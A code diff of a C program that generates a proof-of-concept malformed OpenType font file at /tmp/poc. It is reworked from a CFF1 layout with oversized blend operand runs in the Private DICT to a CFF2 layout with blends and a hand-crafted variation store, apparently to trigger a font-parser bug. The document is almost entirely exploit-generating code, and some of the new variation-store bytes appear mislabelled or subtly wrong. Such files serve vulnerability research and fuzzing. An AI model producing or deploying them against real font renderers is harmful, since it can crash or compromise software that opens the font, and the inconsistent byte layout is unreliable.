@@ -1,134 +1,149 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <stdint.h>
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
-    if (!f) return 1;
+    if (!f) { perror("fopen"); return 1; }
 
-    /* OTTO header */
-    fwrite("OTTO", 1, 4, f);
-    fputc(0, f); fputc(1, f);       /* numTables = 1 */
-    fputc(0, f); fputc(0, f);       /* searchRange */
-    fputc(0, f); fputc(0, f);       /* entrySelector */
-    fputc(0, f); fputc(0, f);       /* rangeShift */
+    /* OpenType header: sfVersion = 'OTTO', numTables = 1 */
+    fputc(0x4F, f); fputc(0x54, f); fputc(0x54, f); fputc(0x4F, f);
+    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); /* numTables = 1 */
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* searchRange, entrySelector, rangeShift */
 
-    /* Table record: 16 bytes */
-    fwrite("CFF ", 1, 4, f);
-    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* checksum */
-    long off_pos = ftell(f);
-    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* offset */
-    long len_pos = ftell(f);
-    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* length */
+    /* Table record: tag = 'CFF2' */
+    fputc(0x43, f); fputc(0x46, f); fputc(0x46, f); fputc(0x32, f); /* 'CFF2' */
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* checksum placeholder */
 
-    long cff_base = ftell(f);
+    long offset_pos = ftell(f);
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* offset placeholder */
+    long length_pos = ftell(f);
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* length placeholder */
 
-    /* CFF1 header */
-    fputc(1, f);                     /* major = 1 */
-    fputc(0, f);                     /* minor = 0 */
-    fputc(4, f);                     /* hdrSize = 4 */
-    fputc(1, f);                     /* offSize = 1 */
+    /* CFF data starts here */
+    long cff_start = ftell(f);
 
-    /* Name INDEX: count=1, name="A" */
-    fputc(0, f); fputc(1, f);       /* count = 1 */
-    fputc(1, f);                     /* offSize = 1 */
-    fputc(1, f);                     /* offset[0] = 1 */
-    fputc(2, f);                     /* offset[1] = 2 */
-    fputc('A', f);                   /* name data */
+    /* CFF2 Header: 5 bytes total */
+    fputc(0x02, f); /* major version 2 */
+    fputc(0x00, f); /* minor version 0 */
+    fputc(0x05, f); /* hdrSize = 5 */
+    long topdict_len_pos = ftell(f);
+    fputc(0x00, f); fputc(0x00, f); /* placeholder for topDictLength */
 
-    /* Top DICT INDEX */
-    fputc(0, f); fputc(1, f);       /* count = 1 */
-    fputc(1, f);                     /* offSize = 1 */
-    fputc(1, f);                     /* offset[0] = 1 */
-    long top_off1_pos = ftell(f);
-    fputc(0, f);                     /* offset[1] placeholder */
-    long top_data_start = ftell(f);
-
-    /* Top DICT data: MultipleMaster + Private + CharStrings */
-    fputc(0x8B + 2, f);             /* push 2 */
-    fputc(0x8B + 1, f);             /* push 1 */
-    fputc(0x8B, f);                 /* push 0 */
-    fputc(0x8B, f);                 /* push 0 */
-    fputc(0x8B, f);                 /* push 0 */
-    fputc(0x1A, f);                 /* MultipleMaster */
-
-    /* Private DICT: <size> <offset> 0x12 */
-    long priv_ref_pos = ftell(f);
-    fputc(0x8B, f);                 /* size placeholder */
-    fputc(0x8B, f);                 /* offset placeholder */
-    fputc(0x12, f);                 /* Private */
-
-    /* CharStrings: <offset> 0x11 */
-    long char_ref_pos = ftell(f);
-    fputc(0x8B, f);                 /* offset placeholder */
-    fputc(0x11, f);                 /* CharStrings */
-
-    long top_data_end = ftell(f);
-    long top_data_sz = top_data_end - top_data_start;
-
-    /* Patch offset[1] */
-    fseek(f, top_off1_pos, SEEK_SET);
-    fputc((uint8_t)(top_data_sz + 1), f);
-    fseek(f, top_data_end, SEEK_SET);
-
-    /* String INDEX: empty */
-    fputc(0, f); fputc(0, f);       /* count = 0 */
-
-    /* Global Subr INDEX: empty */
-    fputc(0, f); fputc(0, f);       /* count = 0 */
-
-    /* CharStrings INDEX: count=1, one endchar */
-    long cs_start = ftell(f);
-    fputc(0, f); fputc(1, f);       /* count = 1 */
-    fputc(1, f);                     /* offSize = 1 */
-    fputc(1, f);                     /* offset[0] = 1 */
-    fputc(2, f);                     /* offset[1] = 2 */
-    fputc(0x0E, f);                  /* endchar */
-
-    /* Private DICT */
-    long priv_start = ftell(f);
-    fputc(0x8B, f); fputc(0x1E, f);  /* vsindex 0 */
-
-    /* First blend: 15 zeros + numBlends=5 */
-    for (int i = 0; i < 15; i++)
-        fputc(0x8B, f);
-    fputc(0x8B + 5, f);
-    fputc(0x0F, f);
-
-    /* Second blend: 24 zeros + numBlends=8 */
-    for (int i = 0; i < 24; i++)
-        fputc(0x8B, f);
-    fputc(0x8B + 8, f);
-    fputc(0x0F, f);
-
-    long priv_end = ftell(f);
-    long priv_sz = priv_end - priv_start;
-    long priv_off = priv_start - cff_base;
-    long cs_off = cs_start - cff_base;
-
-    /* Patch Private DICT reference */
-    fseek(f, priv_ref_pos, SEEK_SET);
-    fputc((uint8_t)(priv_sz + 139), f);
-    fputc((uint8_t)(priv_off + 139), f);
+    /* Top DICT data */
+    long topdict_data_start = ftell(f);
+    /* Private size 20 */
+    fputc(0x9F, f);
+    /* Private offset (single byte placeholder) */
+    long private_offset_pos = ftell(f);
+    fputc(0x00, f);
+    /* Private operator */
     fputc(0x12, f);
-
-    /* Patch CharStrings reference */
-    fseek(f, char_ref_pos, SEEK_SET);
-    fputc((uint8_t)(cs_off + 139), f);
+    /* CharStrings offset (single byte placeholder) */
+    long charstrings_offset_pos = ftell(f);
+    fputc(0x00, f);
+    /* CharStrings operator */
     fputc(0x11, f);
+    /* vstore offset (single byte placeholder) */
+    long vstore_offset_pos = ftell(f);
+    fputc(0x00, f);
+    /* vstore operator (0x18) */
+    fputc(0x18, f);
 
-    /* Patch table record */
+    long topdict_data_end = ftell(f);
+    long topdict_data_length = topdict_data_end - topdict_data_start;
+
+    /* Patch topDictLength */
+    fseek(f, topdict_len_pos, SEEK_SET);
+    fputc((topdict_data_length >> 8) & 0xFF, f);
+    fputc(topdict_data_length & 0xFF, f);
+
+    /* Global Subrs INDEX: empty (4-byte count) */
+    fseek(f, topdict_data_end, SEEK_SET);
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+
+    /* Private DICT starts here */
+    long private_start = ftell(f);
+
+    /* Private DICT: vsindex (0x16), then two blends (0x17) with 3 operands each */
+    fputc(0x8B, f); /* push 0 */
+    fputc(0x16, f); /* vsindex operator (opcode 22) */
+    /* First blend: push 0, push 1, push 2 (3 operands for numBlends=1) */
+    fputc(0x8B, f); fputc(0x8C, f); fputc(0x8D, f); fputc(0x17, f);
+    /* Second blend: push 0, push 1, push 2 (3 operands) */
+    fputc(0x8B, f); fputc(0x8C, f); fputc(0x8D, f); fputc(0x17, f);
+
+    /* Pad to exactly 20 bytes with zeros */
+    long private_end = ftell(f);
+    long private_size = private_end - private_start;
+    for (long i = private_size; i < 20; i++) {
+        fputc(0x00, f);
+    }
+
+    /* CharStrings INDEX: empty (4-byte count) */
+    long charstrings_start = ftell(f);
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+
+    /* Variation Store INDEX: count=1 (4 bytes), off_size=1 */
+    long vstore_start = ftell(f);
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); /* count = 1 */
+    fputc(0x01, f); /* off_size = 1 */
+    fputc(0x01, f); /* offset[0] = 1 */
+    fputc(0x1D, f); /* offset[1] = 29 (28 bytes of VarStore data + 1) */
+
+    /* VarStore data: 28 bytes */
+    fputc(0x01, f); /* Format = 1 */
+    /* RegionList: axisCount = 1, regionCount = 1 */
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
+    /* Region: axis = 0, start = 0.0, end = 1.0 */
+    fputc(0x00, f); fputc(0x00, f);
+    fputc(0x00, f); fputc(0x00, f);
+    fputc(0x40, f); fputc(0x00, f);
+    /* VarData: varDataCount = 1 */
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
+    /* VarData entry: numAxes = 1, regionIndices[0] = 0 */
+    fputc(0x00, f); fputc(0x01, f);
+    fputc(0x00, f); fputc(0x00, f);
+    /* numRows = 1 */
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
+    /* Data: 1 row of 1 value = 0.5 */
+    fputc(0x20, f); fputc(0x00, f);
+
     long cff_end = ftell(f);
-    long cff_sz = cff_end - cff_base;
-    fseek(f, off_pos, SEEK_SET);
-    fputc((uint8_t)(cff_base >> 24), f);
-    fputc((uint8_t)(cff_base >> 16), f);
-    fputc((uint8_t)(cff_base >> 8), f);
-    fputc((uint8_t)(cff_base & 0xFF), f);
-    fseek(f, len_pos, SEEK_SET);
-    fputc((uint8_t)(cff_sz >> 24), f);
-    fputc((uint8_t)(cff_sz >> 16), f);
-    fputc((uint8_t)(cff_sz >> 8), f);
-    fputc((uint8_t)(cff_sz & 0xFF), f);
+    long cff_length = cff_end - cff_start;
+
+    /* Compute offsets */
+    long private_offset = private_start - cff_start;
+    long charstrings_offset = charstrings_start - cff_start;
+    long vstore_offset = vstore_start - cff_start;
+
+    /* Patch private offset */
+    fseek(f, private_offset_pos, SEEK_SET);
+    fputc(private_offset + 139, f);
+
+    /* Patch charstrings offset */
+    fseek(f, charstrings_offset_pos, SEEK_SET);
+    fputc(charstrings_offset + 139, f);
+
+    /* Patch vstore offset */
+    fseek(f, vstore_offset_pos, SEEK_SET);
+    fputc(vstore_offset + 139, f);
+
+    /* Patch table record offset and length */
+    fseek(f, offset_pos, SEEK_SET);
+    uint32_t cff_offset = (uint32_t)cff_start;
+    fputc((cff_offset >> 24) & 0xFF, f);
+    fputc((cff_offset >> 16) & 0xFF, f);
+    fputc((cff_offset >> 8) & 0xFF, f);
+    fputc(cff_offset & 0xFF, f);
+
+    fseek(f, length_pos, SEEK_SET);
+    uint32_t cff_length32 = (uint32_t)cff_length;
+    fputc((cff_length32 >> 24) & 0xFF, f);
+    fputc((cff_length32 >> 16) & 0xFF, f);
+    fputc((cff_length32 >> 8) & 0xFF, f);
+    fputc(cff_length32 & 0xFF, f);
 
     fclose(f);
     return 0;
